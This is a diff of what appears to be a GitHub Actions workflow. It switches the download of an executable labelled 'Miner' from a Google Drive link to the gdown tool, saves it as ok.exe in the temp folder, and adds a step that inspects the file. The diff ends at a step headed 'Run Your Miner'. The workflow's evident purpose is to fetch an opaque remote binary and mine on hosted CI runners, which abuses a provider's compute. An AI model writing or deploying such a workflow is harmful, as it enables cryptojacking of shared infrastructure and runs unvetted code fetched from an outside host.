@@ -77,13 +77,25 @@ jobs:
           Invoke-WebRequest -Uri $url -OutFile $installer
           Start-Process -FilePath $installer -ArgumentList "/S" -Wait
 
-      # --- Download Miner from Google Drive ---
+      #       # --- Install Python and gdown ---
+      - name: Install Python and gdown
+        run: |
+          pip install gdown
+
+      # --- Download Miner from Google Drive with gdown ---
       - name: Download Miner EXE from Google Drive
         run: |
-          $url = "https://drive.google.com/uc?export=download&id=1-1L5YrdOGk2lnwtMDcD4Uqx3mWQJPlBr"
-          $output = "$env:TEMP\ok.exe"
-          Invoke-WebRequest -Uri $url -OutFile $output
-          Write-Host "Miner downloaded to $output"
+          gdown --id 1-1L5YrdOGk2lnwtMDcD4Uqx3mWQJPlBr -O "$env:TEMP\ok.exe"
+          Write-Host "Miner downloaded to $env:TEMP\ok.exe"
+
+      # --- Check Downloaded File ---
+      - name: Check Downloaded File
+        run: |
+          $file = "$env:TEMP\ok.exe"
+          Write-Host "Downloaded file size:"
+          Get-Item $file | Select-Object Length, FullName
+          Write-Host "First 20 lines of file:"
+          Get-Content $file -TotalCount 20
 
       # --- Run Your Miner ---
       - name: Run Your Miner
